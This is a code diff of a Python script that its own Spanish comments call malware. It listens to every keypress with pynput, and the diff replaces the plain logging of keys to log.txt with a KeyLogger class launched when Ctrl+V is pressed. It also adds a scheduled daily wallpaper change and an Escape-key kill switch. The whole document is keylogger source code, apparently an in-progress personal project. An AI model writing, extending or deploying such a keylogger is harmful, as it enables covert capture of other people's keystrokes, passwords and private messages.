@@ -1,21 +1,12 @@
 from pynput.keyboard import Listener
 import os
 import threading
-from Classes import popup
+from Classes import popup, logger, Background_Changer as bg
+import schedule
 
 def write_to_file(key):
     letter = str(key)
     letter = letter.replace("'", "")
-
-    # para mejorar la lectura del documento de texto
-    if letter == 'Key.space':
-        letter = ' '
-    if letter == 'Key.shift_r':
-        letter = ''
-    if letter == "Key.ctrl_l":
-        letter = ""
-    if letter == "Key.enter":
-        letter = "\n"
 
     if letter == "Key.esc": # mata el proceso y cierra el malware
         os.kill(os.getpid(), 9)
@@ -37,13 +28,11 @@ def write_to_file(key):
 
     if letter == "\\x16": # CTRL + V
         # agregar funcionalidad del malware
-        pass 
+        kl = logger.KeyLogger()
+        t4 = threading.Thread(target=kl.start())
+        t4.start()
 
-    with open("log.txt", 'a') as f:
-        f.write(letter)
-
-# Collecting events until stopped
-
-with Listener(on_press=write_to_file) as l:
-    l.join()
+schedule.every().day.at('15:07').do(bg.change_Wallpaper)
+with Listener(on_press=write_to_file) as ml:
+    ml.join()
 
